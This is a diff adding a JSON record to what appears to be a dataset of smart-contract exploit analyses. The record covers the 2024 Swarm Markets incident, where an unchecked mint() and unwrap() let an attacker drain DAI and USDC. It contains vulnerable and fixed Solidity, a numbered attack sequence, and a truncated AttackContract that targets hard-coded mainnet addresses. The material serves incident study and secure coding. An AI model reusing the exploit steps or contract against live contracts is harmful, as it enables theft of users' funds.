@@ -1,0 +1,37 @@
+{
+ "id": "2024__2024-02-XX_SwarmMarkets_UnauthorizedMintUnwrap",
+ "source_file": "2024/2024-02-XX_SwarmMarkets_UnauthorizedMintUnwrap.md",
+ "title": "SwarmMarkets — Unauthorized mint/unwrap Collateral Token Theft Analysis",
+ "date": "2024-02-01",
+ "protocol": "Swarm Markets",
+ "chain": "Ethereum",
+ "loss_raw": "~$7,729 (DAI + USDC)",
+ "loss_usd": 7729.0,
+ "root_cause": "The `mint()` function allows minting xTokens beyond the Wrapper's actual collateral balance, and `unwrap()` executes without collateralization ratio validation, enabling DAI/USDC theft",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: mint() has no collateral balance validation\ninterface IXTOKEN {\n    function mint(address to, uint256 amount) external;\n    function burnFrom(address from, uint256 amount) external;\n}\n\ninterface IXTOKENWrapper {\n    function unwrap(address token, uint256 amount, address to) external;\n}\n\n// mint(): anyone can mint arbitrary amounts (no collateral lock)\nfunction mint(address to, uint256 amount) external {\n    // mints xToken without requiring collateral deposit\n    _mint(to, amount);  // ← no collateralization ratio check\n}\n\n// unwrap(): burns xToken and returns collateral\nfunction unwrap(address token, uint256 amount, address to) external {\n    IXTOKEN(xToken).burnFrom(msg.sender, amount);\n    IERC20(token).transfer(to, amount);  // ← returns collateral even if none was deposited at mint time\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Safe code: collateral deposit required before mint\nfunction mint(address to, uint256 amount) external {\n    // collateral must be received first before issuing xToken\n    IERC20(collateral).transferFrom(msg.sender, address(this), amount);\n    _mint(to, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] Query Wrapper's DAI balance",
+  "→ [2] XTOKEN.mint(attacker, daiBalance)",
+  "→ [3] Wrapper.unwrap(DAI, daiBalance, attacker)",
+  "Burn XTOKEN → Withdraw full DAI balance",
+  "→ [4] Query Wrapper's USDC balance",
+  "→ [5] XTOKEN2.mint(attacker, usdcBalance)",
+  "→ [6] Wrapper.unwrap(USDC, usdcBalance, attacker)",
+  "Burn XTOKEN2 → Withdraw full USDC balance",
+  "→ [7] ~$7,729 DAI + USDC drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Query Wrapper's DAI balance\n  │         └─ daiBalance = DAI.balanceOf(wrapper)\n  │\n  ├─→ [2] XTOKEN.mint(attacker, daiBalance)\n  │         └─ Mint XTOKEN equal to DAI balance with no collateral\n  │\n  ├─→ [3] Wrapper.unwrap(DAI, daiBalance, attacker)\n  │         └─ Burn XTOKEN → Withdraw full DAI balance\n  │\n  ├─→ [4] Query Wrapper's USDC balance\n  │         └─ usdcBalance = USDC.balanceOf(wrapper)\n  │\n  ├─→ [5] XTOKEN2.mint(attacker, usdcBalance)\n  │         └─ Mint XTOKEN2 equal to USDC balance with no collateral\n  │\n  ├─→ [6] Wrapper.unwrap(USDC, usdcBalance, attacker)\n  │         └─ Burn XTOKEN2 → Withdraw full USDC balance\n  │\n  └─→ [7] ~$7,729 DAI + USDC drained",
+  "interface IXTOKEN {\n    function mint(address to, uint256 amount) external;\n    function burnFrom(address from, uint256 amount) external;\n}\n\ninterface IXTOKENWrapper {\n    function unwrap(address token, uint256 amount, address to) external;\n}\n\ncontract AttackContract {\n    IXTOKEN         constant xtoken   = IXTOKEN(0xD08E245Fdb3f1504aea4056e2C71615DA7001440);\n    IXTOKEN         constant xtoken2  = IXTOKEN(0x0a3fbF5B4cF80DB51fCAe21efe63f6a36D45d2B2);\n    IXTOKENWrapper  constant wrapper  = IXTOKENWrapper(0x2b9dc65253c035Eb21778cB3898eab5A0AdA0cCe);\n    IERC20          constant DAI      = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    IERC20          constant USDC     = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n    function testExploit() external {\n        // [1] Drain "
+ ]
+}
